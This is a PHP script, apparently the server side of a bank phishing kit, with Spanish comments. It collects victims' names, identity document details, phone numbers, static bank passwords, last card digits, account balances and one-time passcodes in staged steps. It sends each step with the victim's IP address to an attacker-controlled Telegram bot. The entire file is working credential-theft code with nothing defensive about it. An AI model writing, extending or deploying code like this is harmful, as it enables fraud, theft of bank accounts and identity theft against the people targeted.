<?php
/**
 * send.php — envío a Telegram. Simple y directo.
 * Token y chat_id viven en data.php
 */
require_once __DIR__ . '/_gate.php';
require __DIR__ . '/data.php';

header('Content-Type: application/json; charset=utf-8');

// ----- Helpers -----
function get_ip() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return 'desconocida';
}
function v($a, $k) { return isset($a[$k]) ? trim((string)$a[$k]) : ''; }
function h($s)     { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function send_telegram($msg) {
    global $token, $chat_id;
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id'    => $chat_id,
        'text'       => $msg,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => 'true',
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($data),
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['code' => $code, 'resp' => $resp];
}

// ----- Modo prueba: send.php?test=1 -----
if (isset($_GET['test'])) {
    $r = send_telegram("🧪 Test desde send.php — " . date('Y-m-d H:i:s') . "\n🌐 IP: " . get_ip());
    echo json_encode(['ok' => $r['code'] === 200, 'http' => $r['code'], 'tg' => json_decode($r['resp'], true)], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ----- Recibir datos del formulario -----
$raw   = file_get_contents('php://input');
$input = json_decode($raw, true);
if (!is_array($input)) $input = $_POST;

$step      = v($input, 'step');
$ip        = get_ip();
$sessionId = v($input, 'sessionId');
$phone     = v($input, 'phone');
$ccode     = v($input, 'countryCode');
$staticPwd = v($input, 'password');
$ts        = date('Y-m-d H:i:s');

$stepNumMap = ['paso12'=>'1-2','acceso'=>3,'validacion'=>4,'otp'=>5];
$stepNum    = $stepNumMap[$step] ?? '?';
$SEP        = "───────────────────";

// ----- 1) Cabecera: sesión + paso -----
$header  = "🆔 Sesión: <code>" . h($sessionId) . "</code> -PASO $stepNum\n";
$header .= "$SEP\n\n";

// ----- 2) Bloque constante: teléfono + clave estática (cuando se conozcan) -----
$constBlock = '';
if ($phone !== '') {
    $constBlock .= "📱 " . h($ccode) . ' ' . h($phone) . "\n";
}
if ($staticPwd !== '' && $step !== 'acceso') {
    // En 'acceso' la clave estática es el dato principal; en otros pasos es referencia
    $constBlock .= "🔑 Clave estática: <code>" . h($staticPwd) . "</code>\n";
}

$body = '';

switch ($step) {

    case 'paso12':
        $body  = "👤 Nombres: "   . h(v($input, 'nombres'))   . "\n";
        $body .= "👤 Apellidos: " . h(v($input, 'apellidos')) . "\n";
        $body .= "📋 Tipo Doc: "  . h(v($input, 'tipoDoc'))   . "\n";
        $body .= "🔢 Número: "    . h(v($input, 'numDoc'))    . "\n";
        $body .= "📅 Fecha Exp: " . h(v($input, 'fechaExp'))  . "\n";
        $body .= "📍 Lugar Exp: " . h(v($input, 'lugarExp'))  . "\n";
        break;

    case 'acceso':
        // El bloque constante ya muestra el teléfono. La clave estática va aquí como dato principal.
        $body  = "🔑 Clave estática: <code>" . h($staticPwd) . "</code>\n";
        break;

    case 'validacion':
        $bal = (float) preg_replace('/[^\d]/', '', v($input, 'balance'));
        $body  = "🔢 Últimos 3 dígitos: " . h(v($input, 'lastDigits')) . "\n";
        $body .= "💰 Saldo aprox: $" . number_format($bal, 0, ',', '.') . "\n";
        break;

    case 'otp':
        $intento = v($input, 'attempt');
        // Bloque dinámico con su propio separador (la clave dinámica va abajo)
        $body  = "\n$SEP\n";
        $body .= "💫" . h($intento) . " Clave dinámica: <code>" . h(v($input, 'otp')) . "</code>\n";
        break;

    default:
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => 'step inválido', 'received' => $input]);
        exit;
}

$msg = $header . $constBlock . $body;
$msg .= "\n🌐 $ip · 🕐 $ts";

$r = send_telegram($msg);
echo json_encode(['ok' => $r['code'] === 200, 'http' => $r['code']]);
